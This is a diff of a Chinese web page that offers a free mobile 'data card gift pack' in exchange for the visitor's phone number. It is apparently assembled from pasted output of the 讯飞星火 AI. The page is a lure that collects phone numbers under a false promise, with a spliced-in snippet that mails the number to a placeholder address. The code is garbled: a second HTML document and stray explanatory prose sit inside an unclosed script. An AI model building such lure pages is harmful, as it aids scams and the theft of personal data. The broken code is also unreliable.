@@ -1,2 +1,56 @@
-<title>助梦网络达人在线</title>
-<h1>助梦网络达人QQ2829968806</h1>
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>流量卡领取</title>
+</head>
+<body>
+    <h1>欢迎使用我们的流量卡！</h1>
+    <p>为了感谢您的支持，我们特别推出了流量大礼包活动。只需输入您的手机号码，即可领取！</p>
+    <form id="phoneForm">
+        <label for="phoneNumber">请输入您的手机号码：</label>
+        <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{11}" required>
+        <button type="submit">领取流量大礼包</button>
+    </form>
+    <script>
+        document.getElementById('phoneForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var phoneNumber = document.getElementById('phoneNumber').value;
+            console.log('用户输入的手机号码为：' + phoneNumber);
+            // 在这里添加将电话号码发送到服务器的代码
+<head>
+    <title>发送数字到邮箱</title>
+    <script>
+        function sendNumberToEmail() {
+            var number = "phoneNumber"; // 这里替换为您的数字字符串
+            var email = "your_email@example.com"; // 这里替换为您的电子邮件地址
+            var subject = "数字邮件";
+            var body = "这是您要发送的数字：" + number;
+
+            window.location.href = "mailto:" + email + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+        }
+    </script>
+</head>
+<body>
+    <form onsubmit="event.preventDefault(); sendNumberToEmail();">
+        <input type="text" name="number" value="1234567890" readonly>
+        <input type="hidden" name="email" value="your_email@example.com">
+        <input type="submit" value="发送数字到邮箱">
+    </form>
+</body>
+</html>
+```
+
+请注意，这种方法可能不适用于所有电子邮件客户端，因为它们可能不支持直接从网页发送电子邮件。在这种情况下，您可能需要使用第三方服务（如SendGrid、Mailgun等）来发送电子邮件。
+
+（内容由讯飞星火AI生成）
+        });
+    </script>
+</body>
+</html>
+```
+
+这段代码创建了一个简单的HTML页面，其中包含一个标题、一段介绍文本和一个表单。表单中有一个标签、一个输入框和一个提交按钮。当用户点击提交按钮时，JavaScript代码会阻止表单的默认提交行为，并获取输入框中的电话号码。您可以在`console.log`语句下方添加将电话号码发送到服务器的代码。
+
+（内容由讯飞星火AI生成）
